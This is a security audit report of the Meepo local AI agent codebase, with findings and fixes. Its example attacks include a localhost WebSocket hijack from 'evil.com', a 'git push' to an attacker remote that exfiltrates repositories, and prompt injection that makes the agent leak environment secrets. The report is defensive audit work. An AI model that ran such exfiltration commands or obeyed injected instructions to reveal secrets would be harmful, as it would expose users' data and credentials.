# Meepo Security Audit Report

**Date:** 2025-02-15 (v2)  
**Previous audit:** 2025-01-XX (v1)  
**Auditor:** Deep Security Audit (White Hat)  
**Scope:** Full codebase — 8 crates across the Meepo workspace  
**Methodology:** Manual source code review of all security-critical paths

---

## Executive Summary

Meepo demonstrates an **excellent security posture** for a local AI agent. Since the v1 audit, **all 2 Critical, 3 of 4 High, and 3 of 7 Medium findings have been remediated**. The codebase now features defense-in-depth across most attack surfaces: a tightened command allowlist (removed `env`, `printenv`, `curl`, `wget`, `osascript`, `python`, `node`, `ruby`), SSRF protection with DNS-pinned IP resolution, AppleScript sanitization, constant-time token comparison, env-var allowlisting, enforced config file permissions, and comprehensive input validation.

New code added since v1 (gateway, multi-model providers, usage tracking, secrets manager, guardrails) is generally well-engineered. However, several new and residual findings were identified.

### Remediation Status from v1 Audit

| ID | Finding | Status |
|----|---------|--------|
| C-1 | `env`/`printenv` in allowlist | **FIXED** — removed, with comment explaining exclusion |
| C-2 | `curl`/`wget` in allowlist | **FIXED** — removed |
| H-1 | TOCTOU in SSRF DNS | **FIXED** — `validate_url()` returns resolved IPs, `raw_fetch()` pins them via `reqwest::resolve()` |
| H-2 | `osascript` in allowlist | **FIXED** — removed |
| H-3 | `screenshot_page` missing path validation | **FIXED** — both Safari and Chrome now call `validate_screenshot_path()` |
| H-4 | `get_cookies` bypasses JS blocklist | **FIXED** — both implementations now return `Err("Cookie access is disabled")` |
| M-1 | A2A no TLS | **MITIGATED** — A2A server hardcoded to `127.0.0.1` bind |
| M-2 | A2A hand-rolled HTTP parser | **OPEN** — still uses manual TCP parsing |
| M-3 | Slack no user allowlist | **FIXED** — `allowed_users` field added to `SlackConfig`, enforced in polling loop |
| M-4 | MCP client arbitrary command execution | **OPEN** — still spawns config-specified commands |
| M-5 | Python/Node in allowlist | **FIXED** — removed from `ALLOWED_COMMANDS` |
| M-6 | iMessage logs message content | **FIXED** — now logs only sender + char count |
| M-7 | `browse_url` auth header injection | **FIXED** — `BLOCKED_HEADERS` list added |
| L-1 | `mask_secret` UTF-8 panic | **FIXED** — now uses `.chars()` iterator |
| L-2 | `validate_file_path` `is_in_cwd` permissive | **OPEN** — still allows CWD-relative access |
| L-3 | A2A client no SSRF protection | **OPEN** — still no URL validation on peer URLs |
| L-4 | iMessage `send_imessage` no timeout | **FIXED** — now wrapped with 30s `tokio::time::timeout()` |
| L-5 | AppleScript sanitization edge cases | **OPEN** — no fuzz testing added |
| I-2 | Config permissions warning only | **FIXED** — now refuses to start if `mode & 0o077 != 0` |

**Current Finding Summary:**
| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 2 |
| Medium   | 6 |
| Low      | 5 |
| Info     | 6 |

---

## High Findings

### H-1: Gateway — `CorsLayer::permissive()` Allows Cross-Origin Attacks

**File:** `crates/meepo-gateway/src/server.rs:68`  
**Severity:** High  
**CVSS:** 7.5

```rust
.layer(CorsLayer::permissive())
```

The gateway server uses `CorsLayer::permissive()` which allows **any origin** to make requests, including WebSocket upgrades. If the gateway is exposed on a non-localhost interface (configurable via `bind`), any website the user visits can:

1. Connect to the WebSocket endpoint at `/ws`
2. Send `message.send` requests to execute agent commands
3. Read all broadcast events (including agent responses)

Even on localhost, a malicious website can exploit this via JavaScript `fetch()` or `new WebSocket("ws://127.0.0.1:18789/ws")` — browsers allow WebSocket connections to localhost from any origin.

**Attack chain:**
1. User visits `evil.com` while Meepo gateway is running
2. `evil.com` JavaScript connects to `ws://127.0.0.1:18789/ws`
3. If no `auth_token` is configured (default), full access is granted
4. Attacker sends arbitrary commands through the agent

**Recommendation:**
- Replace `CorsLayer::permissive()` with a restrictive policy (e.g., only allow the gateway's own origin)
- For WebSocket, validate the `Origin` header in `ws_handler` and reject non-local origins
- **Require** `auth_token` to be set when gateway is enabled (refuse to start without it)

---

### H-2: Gateway — `/api/status` Endpoint Has No Authentication

**File:** `crates/meepo-gateway/src/server.rs:95-106`  
**Severity:** High  
**CVSS:** 6.0

The `status_handler` does not call `check_auth()`, unlike `sessions_handler` and `ws_handler`. This leaks operational information (session count, connected clients, uptime) to unauthenticated callers. Combined with H-1, any website can probe whether the gateway is running.

```rust
async fn status_handler(State(state): State<GatewayState>) -> impl IntoResponse {
    // No auth check here
    let sessions = state.sessions.count().await;
    ...
}
```

**Recommendation:** Add `check_auth()` to `status_handler`, or at minimum remove session/client counts from the unauthenticated response.

---

## Medium Findings

### M-1: A2A Server — Hand-Rolled HTTP Parser (Carried from v1)

**File:** `crates/meepo-a2a/src/server.rs:60-170`  
**Severity:** Medium  
**CVSS:** 5.5

The A2A server still implements its own HTTP request parser. Risks include:
- HTTP request smuggling via malformed `Content-Length`
- No chunked transfer encoding support
- No HTTP/1.1 pipelining handling
- Header parsing doesn't limit header count or total size (potential DoS)

**Recommendation:** Replace with `axum` (already a dependency in `meepo-gateway`).

---

### M-2: MCP Client — Arbitrary Command Execution (Carried from v1)

**File:** `crates/meepo-mcp/src/client.rs:41-53`  
**Severity:** Medium  
**CVSS:** 5.8

The MCP client spawns external processes from config values without validation. Config file permissions are now enforced (chmod 600), which reduces the attack surface, but the risk remains if the user is tricked into adding a malicious MCP server entry.

**Recommendation:** Validate MCP server commands against a known-good list, or display a confirmation prompt on first use of a new MCP server.

---

### M-3: `EnvSecretsProvider` — No Allowlist on Secret Resolution

**File:** `crates/meepo-core/src/secrets.rs:48-59`  
**Severity:** Medium  
**CVSS:** 5.0

```rust
async fn get(&self, key: &str) -> Result<Option<String>> {
    Ok(std::env::var(key).ok())
}
```

The `EnvSecretsProvider` resolves **any** environment variable by name. If the agent is tricked (via prompt injection) into calling `$secret{PATH}` or `$secret{AWS_SECRET_ACCESS_KEY}`, it can exfiltrate arbitrary env vars. This bypasses the config-level `ALLOWED_ENV_VARS` allowlist since secrets resolution happens at runtime.

**Recommendation:** Apply the same `ALLOWED_ENV_VARS` allowlist (or a dedicated secrets allowlist) to `EnvSecretsProvider::get()`.

---

### M-4: Gateway — `auth_token` Defaults to Empty (Auth Disabled)

**File:** `crates/meepo-cli/src/config.rs:819-828`  
**Severity:** Medium  
**CVSS:** 5.5

```rust
impl Default for GatewayConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            bind: default_gateway_bind(),  // 127.0.0.1
            port: default_gateway_port(),  // 18789
            auth_token: String::new(),     // empty = no auth
        }
    }
}
```

When the gateway is enabled, if the user doesn't set `auth_token`, all endpoints (including WebSocket and session management) are completely unauthenticated. Combined with H-1 (permissive CORS), this is a significant risk.

**Recommendation:** Refuse to start the gateway if `auth_token` is empty. Auto-generate a random token on `meepo init` and display it to the user.

---

### M-5: `validate_file_path` — `is_in_cwd` Overly Permissive (Carried from v1, upgraded)

**File:** `crates/meepo-core/src/tools/system.rs:14-75`  
**Severity:** Medium (upgraded from Low)  
**CVSS:** 5.0

The `read_file` and `write_file` tools use `validate_file_path()` which allows access to any file under the current working directory. This is separate from the `filesystem.rs` tools which enforce `allowed_directories`. If the daemon is started from `$HOME`, the agent can read/write any file in the home directory, including `~/.ssh/`, `~/.aws/`, `~/.meepo/config.toml`, etc.

**Recommendation:** Remove the `is_in_cwd` fallback and require all file access to go through `allowed_directories` validation, or at minimum add a blocklist of sensitive directories (`~/.ssh`, `~/.aws`, `~/.gnupg`, etc.).

---

### M-6: `run_command` — `git` Can Exfiltrate via `git push` to Arbitrary Remotes

**File:** `crates/meepo-core/src/tools/system.rs:177`  
**Severity:** Medium  
**CVSS:** 4.5

`git` is in the `ALLOWED_COMMANDS` list. While most git operations are safe, `git push` to an attacker-controlled remote could exfiltrate repository contents. The agent could be tricked into:
```
git remote add evil https://evil.com/repo.git
git push evil main
```

Additionally, `git clone` from a malicious URL could exploit git protocol vulnerabilities.

**Recommendation:** Consider restricting git to read-only subcommands (`git status`, `git log`, `git diff`, `git show`, `git branch`), or validate that push/clone targets are within known-good remotes.

---

## Low Findings

### L-1: `validate_file_path` — `is_in_cwd` Overly Permissive

**Status:** Superseded by M-5 (upgraded to Medium).

---

### L-2: A2A Client — No SSRF Protection (Carried from v1)

**File:** `crates/meepo-a2a/src/client.rs`  
**Severity:** Low  
**CVSS:** 3.3

A2A peer agent URLs from config are not validated against SSRF. Config permissions enforcement mitigates this somewhat.

---

### L-3: AppleScript Sanitization — No Fuzz Testing (Carried from v1)

**File:** `crates/meepo-core/src/platform/macos.rs:15-23`  
**Severity:** Low  
**CVSS:** 3.0

The `sanitize_applescript_string` function has not been fuzz-tested. Edge cases with AppleScript's string handling could exist.

---

### L-4: Gateway WebSocket — Responses Broadcast to All Clients

**File:** `crates/meepo-gateway/src/server.rs:192-196`  
**Severity:** Low  
**CVSS:** 3.5

```rust
// We can't send directly since ws_sender moved; instead broadcast the response
// as a targeted event. In a production system we'd use a per-client sender.
state.events.broadcast(GatewayEvent::new(
    "response",
    serde_json::to_value(&response).unwrap_or_default(),
));
```

All WebSocket responses are broadcast to every connected client. If multiple users are connected, each user sees every other user's responses. The code acknowledges this with a TODO comment.

**Recommendation:** Implement per-client message routing using the request ID or a client-specific channel.

---

### L-5: `content[..MAX_LENGTH]` — Potential UTF-8 Boundary Panic

**File:** `crates/meepo-core/src/tools/system.rs:743-748`  
**Severity:** Low  
**CVSS:** 2.5

```rust
if content.len() > MAX_LENGTH {
    Ok(format!(
        "{}\n\n[Content truncated at {} chars]",
        &content[..MAX_LENGTH],
        MAX_LENGTH
    ))
}
```

`&content[..MAX_LENGTH]` slices by byte offset, not character boundary. If the response contains multi-byte UTF-8 (e.g., CJK, emoji), this will panic. The same pattern appears in the Tavily extract path (line 613).

**Recommendation:** Use `content.char_indices().take_while(|(i, _)| *i < MAX_LENGTH).last()` or `content.floor_char_boundary(MAX_LENGTH)` (nightly) to find a safe truncation point.

---

## Informational Findings

### I-1: No `unsafe` Code — Excellent

**Severity:** Info (Positive)

Zero `unsafe` blocks in the entire codebase. No raw pointer manipulation, no `unsafe impl`, no FFI. The only occurrences of the word "unsafe" are in comments describing SSRF-unsafe IP addresses.

---

### I-2: Config File Permissions — Now Enforced

**File:** `crates/meepo-cli/src/config.rs:1147-1163`  
**Severity:** Info (Positive)

The config loader now **refuses to start** if group/other can read the config file (`mode & 0o077 != 0`), matching SSH's behavior. This is a significant improvement from v1.

---

### I-3: Env Var Allowlist — Good Defense (14 vars)

**File:** `crates/meepo-cli/src/config.rs:1210-1225`  
**Severity:** Info (Positive)

The `ALLOWED_ENV_VARS` allowlist for config expansion now covers 14 specific variables. Unrecognized `${VAR}` references are left unexpanded with a warning.

---

### I-4: Rate Limiting Present on All Channels

**Severity:** Info (Positive)

All channel adapters (Discord, Slack, iMessage) implement rate limiting via `RateLimiter` (10 messages per 60 seconds per user). The autonomous loop also has `max_calls_per_minute` rate limiting.

---

### I-5: Secrets Manager — Good Path Traversal Prevention

**File:** `crates/meepo-core/src/secrets.rs:80-97`  
**Severity:** Info (Positive)

The `FileSecretsProvider` validates keys against path separators (`/`, `\\`, `..`, `\0`) and verifies the resolved path stays within the secrets directory via `canonicalize()`. This is defense-in-depth.

---

### I-6: Provider Debug Impls Hide API Keys

**Severity:** Info (Positive)

All provider config structs (`AnthropicConfig`, `OpenAiProviderConfig`, `GoogleProviderConfig`, `OpenAiCompatProviderConfig`, `TavilyConfig`, `DiscordConfig`, `SlackConfig`, `A2aConfig`, `GatewayConfig`, `VoiceConfig`) implement custom `Debug` that masks secrets via `mask_secret()`. The `AnthropicProvider` struct also hides the key in its Debug impl.

---

## Positive Security Controls Observed

1. **Command allowlist** with pipeline validation — dangerous commands explicitly excluded with comments (`run_command`)
2. **SSRF protection** with DNS-pinned IP resolution — eliminates TOCTOU (`validate_url` + `reqwest::resolve()`)
3. **AppleScript sanitization** across all platform code
4. **Constant-time token comparison** in both A2A and Gateway auth
5. **Path traversal prevention** with `canonicalize()` + directory checks (filesystem tools, secrets, screenshots)
6. **Env var expansion allowlist** in config loading (14 specific vars)
7. **Secret masking** in all `Debug` impls for config and provider structs
8. **Rate limiting** on all channel adapters + autonomous loop
9. **LRU-bounded caches** preventing memory exhaustion (iMessage sender tracking, A2A tasks)
10. **Timeouts** on all external command execution (30s default, 120s for API calls)
11. **Max body size** enforcement on A2A server (1MB)
12. **Browser JS blocklist** preventing credential theft (13 patterns)
13. **File size limits** on read/write operations
14. **CRLF injection prevention** in HTTP headers
15. **Element type allowlist** for UI automation
16. **Config file permissions enforcement** (chmod 600 required on Unix)
17. **Cookie access disabled** in browser providers
18. **Screenshot path validation** in all browser providers
19. **Sensitive header blocklist** in `browse_url` (7 headers blocked)
20. **Budget enforcement** with daily/monthly limits and warning thresholds
21. **Guardrails system** with configurable block severity and input length limits
22. **Approval queue** for high-risk autonomous actions

---

## Recommended Priority Actions

1. **[High]** Fix gateway CORS — replace `CorsLayer::permissive()` with restrictive policy + WebSocket origin validation
2. **[High]** Add auth to gateway `/api/status` endpoint
3. **[Medium]** Require `auth_token` when gateway is enabled (refuse to start without it)
4. **[Medium]** Add allowlist to `EnvSecretsProvider` to prevent arbitrary env var exfiltration
5. **[Medium]** Replace A2A hand-rolled HTTP parser with `axum`
6. **[Medium]** Remove `is_in_cwd` fallback from `validate_file_path` or add sensitive directory blocklist
7. **[Medium]** Restrict `git` in allowlist to read-only subcommands
8. **[Medium]** Validate MCP server commands against known-good list
9. **[Low]** Fix UTF-8 boundary panics in content truncation (`system.rs:743`)
10. **[Low]** Implement per-client WebSocket message routing in gateway
